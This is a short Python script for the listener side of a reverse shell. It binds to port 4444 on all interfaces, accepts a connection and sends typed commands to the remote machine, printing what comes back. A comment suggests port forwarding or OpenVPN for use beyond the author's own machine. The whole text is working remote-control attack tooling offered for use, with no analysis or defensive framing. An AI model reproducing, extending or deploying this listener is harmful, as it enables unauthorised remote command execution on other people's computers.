#Note i am using it in my own machine if you want to use it globally you need alternative option like port forwarding or openVPN etc. 
import socket
import subprocess

HOST = "0.0.0.0" 
PORT = 4444

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f"[+] Listening on {HOST}:{PORT}")
conn, addr = s.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]}")

while True:
    command = input("Shell> ")
    if command.strip() == "":
        continue
    if command.lower() == "exit":
        conn.send(b"exit")
        break
    conn.send(command.encode())
    output = conn.recv(4096).decode()
    print(output)

conn.close()
